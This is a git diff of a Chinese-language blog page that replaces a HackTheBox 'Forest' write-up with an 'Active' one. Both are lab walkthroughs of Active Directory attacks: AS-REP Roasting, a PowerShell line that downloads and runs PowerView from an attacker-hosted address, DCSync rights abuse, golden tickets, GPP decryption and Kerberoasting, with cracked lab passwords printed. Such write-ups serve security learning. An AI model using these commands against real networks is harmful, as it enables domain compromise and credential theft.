@@ -16,45 +16,34 @@
   <meta name="author" content="Aurey7">
   <meta name="keywords" content="">
   
-    <meta name="description" content="年轻人的第一台Windows靶机 没打过Windows靶机，这台用来熟悉一下套路，收集了国内外很多Writeup总结下大伙的技术和思路 信息收集端口扫描 区域传输失败  SMB没有匿名共享目录  RPCRPC远程过程调用枚举用户，拿到了用户和用户组信息   查找对应的管理员组及管理员信息  enum4linux1enum4linux -v 10.10.10.161 Get User FlagAS-">
+    <meta name="description" content="开局先扫描，可以看到经典的SMB、RPC、LDAP。都是我们信息收集的目标  Get User Flag发现了一个可读的共享  把文件下载下来，发现是两个组策略文件，其中一个文件包含用户名密码 使用gpp-decrypt进行解密  此时我们拥有了用户名active.htb\SVC_TGS和密码GPPstillStandingStrong2k18 获得User Flag  Get Root Flag">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Forest - HackTheBox">
-<meta property="og:url" content="http://aurey7.github.io.git/2023/07/22/Forest-HackTheBox/index.html">
+<meta property="og:title" content="Active - HackTheBox">
+<meta property="og:url" content="http://aurey7.github.io.git/2023/07/22/Active-HackTheBox/index.html">
 <meta property="og:site_name" content="Aurey7&#39;s Blog">
-<meta property="og:description" content="年轻人的第一台Windows靶机 没打过Windows靶机，这台用来熟悉一下套路，收集了国内外很多Writeup总结下大伙的技术和思路 信息收集端口扫描 区域传输失败  SMB没有匿名共享目录  RPCRPC远程过程调用枚举用户，拿到了用户和用户组信息   查找对应的管理员组及管理员信息  enum4linux1enum4linux -v 10.10.10.161 Get User FlagAS-">
+<meta property="og:description" content="开局先扫描，可以看到经典的SMB、RPC、LDAP。都是我们信息收集的目标  Get User Flag发现了一个可读的共享  把文件下载下来，发现是两个组策略文件，其中一个文件包含用户名密码 使用gpp-decrypt进行解密  此时我们拥有了用户名active.htb\SVC_TGS和密码GPPstillStandingStrong2k18 获得User Flag  Get Root Flag">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_xrHIst4ffi.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_GqFcJ1o4JP.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_lRDqPZiCky.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_uiQj0W8ZPd.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_7kmZCIKFhO.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_HTyGLSaBeN.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_r-PfYEK1Uj.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_IZ7Pk1R-Ib.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_7dB8sev2Tg.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_USoKCwUulk.png">
-<meta property="og:image" content="c:\Users\aurey\Downloads\Compressed\Forest\image\image_z7bQv1dJEF.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Og5lUwZJPE.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_-xJi6br8uD.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_RqBqBzOhA2.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_MHATzSpUXl.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_TswtwKGVJ4.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_4WPcocAXUc.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_oVPzDl3xKL.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_iWj0__81hD.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_mNcoq0Dbco.png">
-<meta property="article:published_time" content="2023-07-22T02:16:39.000Z">
-<meta property="article:modified_time" content="2023-07-22T13:20:53.657Z">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_V6eVzNUJuG.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_OZ3VGNfPsz.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_jTGmNhMcMQ.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_yFuamx1-F-.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_zGYojrslUd.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_AapcJ6PdLM.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_1m_DD8vGS0.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_sbjEU20280.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image__ZoZNH6lzb.png">
+<meta property="article:published_time" content="2023-07-22T13:18:52.000Z">
+<meta property="article:modified_time" content="2023-07-22T13:20:19.667Z">
 <meta property="article:author" content="Aurey7">
 <meta property="article:tag" content="HackTheBox">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_xrHIst4ffi.png">
+<meta name="twitter:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_V6eVzNUJuG.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>Forest - HackTheBox - Aurey7&#39;s Blog</title>
+  <title>Active - HackTheBox - Aurey7&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -232,7 +221,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Forest - HackTheBox"></span>
+            <span id="subtitle" data-typed-text="Active - HackTheBox"></span>
           
         </div>
 
@@ -243,8 +232,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-07-22 10:16" pubdate>
-          2023年7月22日 上午
+        <time datetime="2023-07-22 21:18" pubdate>
+          2023年7月22日 晚上
         </time>
       </span>
     
@@ -255,7 +244,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.1k 字
+          521 字
         
       </span>
     
@@ -266,7 +255,7 @@
         
         
         
-          18 分钟
+          5 分钟
         
       </span>
     
@@ -312,88 +301,33 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Forest - HackTheBox</h1>
+            <h1 style="display: none">Active - HackTheBox</h1>
             
             
               <div class="markdown-body">
                 
-                <p>年轻人的第一台Windows靶机</p>
-<p>没打过Windows靶机，这台用来熟悉一下套路，收集了国内外很多Writeup总结下大伙的技术和思路</p>
-<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_xrHIst4ffi.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<h4 id="区域传输"><a href="#区域传输" class="headerlink" title="区域传输"></a>区域传输</h4><p>失败</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_GqFcJ1o4JP.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<h4 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h4><p>没有匿名共享目录</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_lRDqPZiCky.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<h4 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h4><p>RPC远程过程调用枚举用户，拿到了用户和用户组信息</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_uiQj0W8ZPd.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_7kmZCIKFhO.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>查找对应的管理员组及管理员信息</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_HTyGLSaBeN.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<h4 id="enum4linux"><a href="#enum4linux" class="headerlink" title="enum4linux"></a>enum4linux</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">enum4linux -v 10.10.10.161<br></code></pre></td></tr></table></figure>
-<h3 id="Get-User-Flag"><a href="#Get-User-Flag" class="headerlink" title="Get User Flag"></a>Get User Flag</h3><h4 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h4><p>拿到了用户名，这里又暴露了kerberos端口。直接尝试一下AS-REP Roasting攻击。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> user in $(cat user.txt);<span class="hljs-keyword">do</span> python3 examples/GetNPUsers.py -no-pass -dc-ip <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.161</span> htb/$&#123;user&#125; | grep -v impacket;done<br></code></pre></td></tr></table></figure>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_r-PfYEK1Uj.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>拿到了svc-alfresco用户的hash，这里使用john进行破解，得到密码s3rvice</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_IZ7Pk1R-Ib.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<h4 id="WinRM"><a href="#WinRM" class="headerlink" title="WinRM"></a>WinRM</h4><p>拥有账号密码可以直接利用evil-winrm连接</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_7dB8sev2Tg.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<h3 id="Get-Root-Flag"><a href="#Get-Root-Flag" class="headerlink" title="Get Root Flag"></a>Get Root Flag</h3><h4 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h4><ol>
-<li>自行搭建好BloodHound</li>
-<li>使用bloodhound-python进行信息收集</li>
-<li>将收集到的信息（json文件）上传到BloodHound进行分析</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bloodhound-python -d htb.local -u svc-alfresco -p s3rvice -c all -ns 10.10.10.161<br></code></pre></td></tr></table></figure>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_USoKCwUulk.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p><img src="C:\Users\aurey\Downloads\Compressed\Forest\image\image_z7bQv1dJEF.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p><strong>Shortest Path from Owned Principals</strong></p>
-<p>可以发现svc-alfresco在Account Operators组中，该组的成员可以创建和修改大多数类型的帐户，包括用户、本地组和全局组的帐户。</p>
-<p>参考：<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#account-operators" title="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#account-operators">https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#account-operators</a></p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Og5lUwZJPE.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p><strong>Find Shortest Paths to Domain Admins</strong></p>
-<p>分析到达Domain Admins的最短路径</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_-xJi6br8uD.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>Account Operators组对Exchange Windows Permissions组拥有Generic ALL权限</p>
-<h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><ol>
-<li>添加一个用户到Exchange Windows Permissions组中</li>
-<li>利用Exchange Windows Permissions组的WriteDACL授予用户DCSync权限</li>
-<li>通过DCSync进行域同步并窃取用户哈希</li>
-</ol>
-<p>添加用户至Exchange Windows Permissions 组</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_RqBqBzOhA2.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>借助 PowerSploit 中的 powerview.ps1 来滥用<code>WriteDacl</code>权限</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">iex(New-Object Net.webclient).downloadstring(<span class="hljs-string">&#x27;http://10.10.16.76:8000/PowerView.ps1&#x27;</span>)<br></code></pre></td></tr></table></figure>
-<p>创建凭证对象并授予 DCSync 权限</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$pass</span> = convertto-securestring <span class="hljs-string">&#x27;passwd123&#x27;</span> -AsPlainText -Force<br><span class="hljs-variable">$cred</span> = New-Object System.Management.Automation.PSCredential (<span class="hljs-string">&#x27;HTB\aurey&#x27;</span>, <span class="hljs-variable">$pass</span>)<br>Add-DomainObjectAcl -Credential <span class="hljs-variable">$cred</span> -TargetIdentity <span class="hljs-string">&quot;DC=htb,DC=local&quot;</span> -PrincipalIdentity aurey -Rights DCSync<br></code></pre></td></tr></table></figure>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_MHATzSpUXl.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<h4 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h4><p>DCSync可从利用DRS协议通过IDL_DRSGetNCChanges从域控制器复制用户凭据</p>
-<p>使用impacket的secretdump.py获取hash值</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_TswtwKGVJ4.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>使用 <a target="_blank" rel="noopener" href="http://wmiexec.py" title="wmiexec.py">wmiexec.py</a> 通过哈希传递连接管理员</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_4WPcocAXUc.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><p>我们可以通过DCSync拿到的krbtgt做一个黄金票据</p>
-<ol>
-<li>获取Domain SID</li>
-</ol>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_oVPzDl3xKL.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<ol>
-<li>利用上面获取到的Domain SID和krbtgt制作黄金票据</li>
-</ol>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_iWj0__81hD.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_mNcoq0Dbco.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<h3 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h3><p>第一台Windows靶机，算是学习一下套路。跟Linux靶机比较大的区别是需要一定的前置知识</p>
-<p>感觉需要整理一些东西，再开始打后面的Windows靶机：</p>
-<ul>
-<li>Windows常见端口以及对应服务的打法</li>
-<li>回顾Windows域渗透用到的各种方法</li>
-</ul>
-<h4 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h4><ul>
-<li>Official WriteUp</li>
-<li><a target="_blank" rel="noopener" href="https://amirr0r.github.io/posts/htb-forest/" title="https://amirr0r.github.io/posts/htb-forest/">https://amirr0r.github.io/posts/htb-forest/</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/325765.html" title="https://www.freebuf.com/articles/system/325765.html">https://www.freebuf.com/articles/system/325765.html</a></li>
-<li><a target="_blank" rel="noopener" href="https://medium.com/@sinfulz/hackthebox-forest-walkthrough-248fce6fc90d" title="https://medium.com/@sinfulz/hackthebox-forest-walkthrough-248fce6fc90d">https://medium.com/@sinfulz/hackthebox-forest-walkthrough-248fce6fc90d</a></li>
-<li><a target="_blank" rel="noopener" href="https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-forest/" title="https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-forest/">https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-forest/</a></li>
-<li><a target="_blank" rel="noopener" href="https://infosecwriteups.com/htb-forest-write-up-fdd45e8e73bf" title="https://infosecwriteups.com/htb-forest-write-up-fdd45e8e73bf">https://infosecwriteups.com/htb-forest-write-up-fdd45e8e73bf</a></li>
-</ul>
+                <p>开局先扫描，可以看到经典的SMB、RPC、LDAP。都是我们信息收集的目标</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_V6eVzNUJuG.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<h3 id="Get-User-Flag"><a href="#Get-User-Flag" class="headerlink" title="Get User Flag"></a>Get User Flag</h3><p>发现了一个可读的共享</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_OZ3VGNfPsz.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>把文件下载下来，发现是两个组策略文件，其中一个文件包含用户名密码</p>
+<p>使用gpp-decrypt进行解密</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_jTGmNhMcMQ.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>此时我们拥有了用户名<code>active.htb\SVC_TGS</code>和密码<code>GPPstillStandingStrong2k18</code></p>
+<p>获得User Flag</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_yFuamx1-F-.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<h3 id="Get-Root-Flag"><a href="#Get-Root-Flag" class="headerlink" title="Get Root Flag"></a>Get Root Flag</h3><p>BloodHound信息收集一波</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_zGYojrslUd.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>简单看了一下我们的<code>SVC_TGS</code>用户并不在其中，我的理解BloodHound是用来发现各种权限存在的风险的，这里可能没有。（我也不是很懂，欢迎大佬指正）</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_AapcJ6PdLM.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<h4 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h4><p>我们拥有一个用户密码，可以试一下Kerberoasting攻击。</p>
+<p><strong>原理：</strong> Kerberoasting攻击主要是利用Kerberos认证中的第四步：<strong>TGS_REP</strong>，这一步会返回由目标服务实例的NTLM Hash加密的TGS票据，加密算法为RC4-HMAC</p>
+<p>我们可以通过爆破该TGS票据获得服务的NTLM Hash，这里打的是CIFS服务</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_1m_DD8vGS0.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>使用john进行爆破，爆破成功，我们获得了Administrator的密码：<code>Ticketmaster1968</code></p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_sbjEU20280.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>直接smb拿到root.txt</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image__ZoZNH6lzb.png" srcset="/img/loading.gif" lazyload alt=""></p>
 
                 
               </div>
@@ -418,8 +352,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Forest - HackTheBox</div>
-      <div>http://aurey7.github.io.git/2023/07/22/Forest-HackTheBox/</div>
+      <div>Active - HackTheBox</div>
+      <div>http://aurey7.github.io.git/2023/07/22/Active-HackTheBox/</div>
     </div>
     <div class="license-meta">
       
@@ -463,18 +397,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/07/22/Active-HackTheBox/" title="Active - HackTheBox">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Active - HackTheBox</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/07/18/Jupiter-HackTheBox/" title="Jupiter - HackTheBox">
-                        <span class="hidden-mobile">Jupiter - HackTheBox</span>
+                      <a href="/2023/07/22/Forest-HackTheBox/" title="Forest - HackTheBox">
+                        <span class="hidden-mobile">Forest - HackTheBox</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
